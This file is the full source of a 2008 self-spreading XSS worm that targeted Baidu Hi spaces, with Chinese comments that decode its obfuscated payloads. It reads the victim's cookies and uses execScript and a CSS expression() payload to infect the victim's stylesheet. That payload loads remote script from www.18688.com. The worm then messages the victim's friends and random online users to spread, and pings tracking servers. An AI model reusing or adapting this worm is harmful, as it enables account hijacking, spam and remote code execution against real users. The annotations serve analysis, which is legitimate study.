// 分析： https://blog.csdn.net/qq_33605106/article/details/79756478

window.onerror = killErrors;
execScript(unescape('Function%20URLEncoding%28vstrIn%29%0A%20%20%20%20strReturn%20%3D%20%22%22%0A%20%20%20%20For%20aaaa%20%3D%201%20To%20Len%28vstrIn%29%0A%20%20%20%20%20%20%20%20ThisChr%20%3D%20Mid%28vStrIn%2Caaaa%2C1%29%0A%20%20%20%20%20%20%20%20If%20Abs%28Asc%28ThisChr%29%29%20%3C%20%26HFF%20Then%0A%20%20%20%20%20%20%20%20%20%20%20%20strReturn%20%3D%20strReturn%20%26%20ThisChr%0A%20%20%20%20%20%20%20%20Else%0A%20%20%20%20%20%20%20%20%20%20%20%20innerCode%20%3D%20Asc%28ThisChr%29%0A%20%20%20%20%20%20%20%20%20%20%20%20If%20innerCode%20%3C%200%20Then%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20innerCode%20%3D%20innerCode%20+%20%26H10000%0A%20%20%20%20%20%20%20%20%20%20%20%20End%20If%0A%20%20%20%20%20%20%20%20%20%20%20%20Hight8%20%3D%20%28innerCode%20%20And%20%26HFF00%29%5C%20%26HFF%0A%20%20%20%20%20%20%20%20%20%20%20%20Low8%20%3D%20innerCode%20And%20%26HFF%0A%20%20%20%20%20%20%20%20%20%20%20%20strReturn%20%3D%20strReturn%20%26%20%22%25%22%20%26%20Hex%28Hight8%29%20%26%20%20%22%25%22%20%26%20Hex%28Low8%29%0A%20%20%20%20%20%20%20%20End%20If%0A%20%20%20%20Next%0A%20%20%20%20URLEncoding%20%3D%20strReturn%0AEnd%20Function'), 'VBScript');
// 解码后的payload，就是个URLEncoding的功能
// Function URLEncoding(vstrIn)
//     strReturn = ""
//     For aaaa = 1 To Len(vstrIn)
//         ThisChr = Mid(vStrIn,aaaa,1)
//         If Abs(Asc(ThisChr)) < &HFF Then
//             strReturn = strReturn & ThisChr
//         Else
//             innerCode = Asc(ThisChr)
//             If innerCode < 0 Then
//                 innerCode = innerCode + &H10000
//             End If
//             Hight8 = (innerCode  And &HFF00)\\ &HFF
//             Low8 = innerCode And &HFF
//             strReturn = strReturn & "%" & Hex(Hight8) &  "%" & Hex(Low8)
//         End If
//     Next
//     URLEncoding = strReturn
// End Function

cookie = '';
cookieval = document.cookie;
spaceid = spaceurl;
myhibaidu = "http://hi.baidu.com" + spaceid;
xmlhttp = poster();     // 获取XMLHttpRequest对象
debug = 0;
online();
if (spaceid != '/') {
    if (debug == 1) {
        goteditcss();
        document.cookie = 'xssshell/owned/you!';
    }
    if (cookieval.indexOf('xssshell') == -1) {
        goteditcss();
        document.cookie = 'xssshell/owned/you!';
    }
}
function makeevilcss(spaceid, editurl, use) {
    playload = "a{evilmask:ex/*exp/**/ression*/pression(execScript(unescape('d%253D%2522doc%2522%252B%2522ument%2522%253B%250D%250Ai%253D%2522function%2520load%2528%2529%257Bvar%2520x%253D%2522%252Bd%252B%2522.createElement%2528%2527SCRIPT%2527%2529%253Bx.src%253D%2527http%253A//www.18688.com/cache/1.js%2527%253Bx.defer%253Dtrue%253B%2522%252Bd%252B%2522.getElementsByTagName%2528%2527HEAD%2527%2529%255B0%255D.appendChild%2528x%2529%257D%253Bfunction%2520inject%2528%2529%257Bwindow.setTimeout%2528%2527load%2528%2529%2527%252C1000%2529%257D%253Bif%2528window.x%2521%253D1%2529%257Bwindow.x%253D1%253Binject%2528%2529%257D%253B%2522%250D%250AexecScript%2528i%2529')))}";
    // 两次unescape
    // d="doc"+"ument";
    // i="function load(){var x="+d+".createElement('SCRIPT');x.src='http://www.18688.com/cache/1.js';x.defer=true;"+d+".getElementsByTagName('HEAD')[0].appendChild(x)};function inject(){window.setTimeout('load()',1000)};if(window.x!=1){window.x=1;inject()};"
    // execScript(i)

    // 其中payload为
    // function load() {
    //     var x = document.createElement('SCRIPT');
    //     x.src='http://www.18688.com/cache/1.js';
    //     x.defer=true;
    //     document.getElementsByTagName('HEAD')[0].appendChild(x)
    // };
    // function inject() {
    //     window.setTimeout('load()',1000)};
    //     if(window.x!=1) {
    //         window.x=1;
    //         inject()
    //     };
    // }

    action = myhibaidu + "/commit";
    spCssUse = use;
    s = getmydata(editurl);
    re = /\<input type=\"hidden\" id=\"ct\" name=\"ct\" value=\"(.*?)\"/i;
    ct = s.match(re);
    ct = (ct[1]);
    re = /\<input type=\"hidden\" id=\"cm\" name=\"cm\" value=\"(.*?)\"/i;
    cm = s.match(re);
    cm = (cm[1]) / 1 + 1;
    re = /\<input type=\"hidden\" id=\"spCssID\" name=\"spCssID\" value=\"(.*?)\"/i;
    spCssID = s.match(re);
    spCssID = (spCssID[1]);
    spRefUrl = editurl;
    re = /\<textarea(.*?)\>([^\x00]*?)\<\/textarea\>/i;
    spCssText = s.match(re);
    spCssText = spCssText[2];
    spCssText = URLEncoding(spCssText);
    if (spCssText.indexOf('evilmask') !== -1) {     // 这边判断了CSS是否被感染过
        return 1;
    }
    else spCssText = spCssText + "\r\n\r\n" + playload;
    re = /\<input name=\"spCssName\"(.*?)value=\"(.*?)\">/i;
    spCssName = s.match(re);
    spCssName = spCssName[2];
    re = /\<input name=\"spCssTag\"(.*?)value=\"(.*?)\">/i;
    spCssTag = s.match(re);
    spCssTag = spCssTag[2];
    postdata = "ct=" + ct
        + "&spCssUse=1" + "&spCssColorID=1" + "&spCssLayoutID=-1" + "&spRefURL=" + URLEncoding(spRefUrl) + "&spRefURL=" + URLEncoding(spRefUrl) + "&cm=" + cm + "&spCssID=" + spCssID + "&spCssText=" + spCssText + "&spCssName=" + URLEncoding(spCssName) + "&spCssTag=" + URLEncoding(spCssTag);
    result = postmydata(action, postdata);
    sendfriendmsg();
    count();
    hack();
}

// 获取并对CSS进行修改
function goteditcss() {
    src = "http://hi.baidu.com" + spaceid + "/modify/spcrtempl/0";
    s = getmydata(src);
    re = /\<link rel=\"stylesheet\" type=\"text\/css\"href=\"(.*?)\/css\/item\/(.*?)\.css\">/i;
    r = s.match(re);
    nowuse = r[2];
    makeevilcss(spaceid, "http://hi.baidu.com" + spaceid + "/modify/spcss/" + nowuse + ".css/edit", 1);
    return 0;
}

function poster() {
    var request = false;
    if (window.XMLHttpRequest) {
        request = new XMLHttpRequest();
        if (request.overrideMimeType) {
            request.overrideMimeType('text/xml');
        }
    } else if (window.ActiveXObject) {
        var versions = ['Microsoft.XMLHTTP',
            'MSXML.XMLHTTP', 'Microsoft.XMLHTTP',
            'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0',
            'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0',
            'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
        for (var i = 0; i < versions.length; i++) {
            try {
                request = new ActiveXObject(versions[i]);
            } catch (e) { }
        }
    }
    return request;
}

// 向action发送一个POST请求，请求内容为data
function postmydata(action, data) {
    xmlhttp.open("POST", action, false);
    xmlhttp.setRequestHeader('Content-Type',
        'application/x-www-form-urlencoded');
    xmlhttp.send(data);
    return xmlhttp.responseText;
}

// 向action发送一个GET请求
function getmydata(action) {
    xmlhttp.open("GET", action, false);
    xmlhttp.send();
    return xmlhttp.responseText;
}
function killErrors() {
    return true;
}
function count() {
    a = new Image();
    a.src = 'http://img.users.51.la/1563171.asp';
    return 0;
}
function online() {
    online = new Image();
    online.src = 'http://img.users.51.la/1563833.asp';
    return 0;
}
function hack() {
    return 0;
}
function sendfriendmsg() {
    myfurl = myhibaidu + "/friends";
    s = getmydata(myfurl);
    evilmsg = "哈，节日快乐呀!热烈庆祝2008，心情好好，记得要想我呀！\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n" + myhibaidu;
    var D = function (A, B) { A[A.length] = B; };
    re = /(.+)D\(k\,\[([^\]]+?)\]\)(.*)/g;
    friends = s.match(re);
    eval(friends[0]);
    for (i in k) {
        eval('msgimg' + i + '=new Image();');
        eval('msgimg' + i + '.src="http://msg.baidu.com/?ct=22&cm=MailSend&tn=bmSubmit&sn="+URLEncoding(k[i][2])+"&co="+URLEncoding(evilmsg)+"&vcodeinput=";');
    }
}
function onlinemsg() {
    doit = Math.floor(Math.random() * (600 + 1));
    if (doit > 500) {
        evilonlinemsg = "哈哈,还记得我不,加个友情链接吧?\r\n\r\n\r\n我的地址是" + myhibaidu;
        xmlDoc = new
            ActiveXObject("Microsoft.XMLDOM");
        xmlDoc.async = false;
        xmlDoc.load("http://hi.baidu.com/sys/file/moreonline.xml");
        online = xmlDoc.documentElement;
        users = online.getElementsByTagName("id");
        x = Math.floor(Math.random() * (200 + 1));
        eval('msgimg' + x + '=new Image();');
        eval('msgimg' + x + '.src="http://msg.baidu.com/?ct=22&cm=MailSend&tn=bmSubmit&sn="+URLEncoding(users[x].text)+"&co="+URLEncoding(evilonlinemsg)+"&vcodeinput=";');
    }
}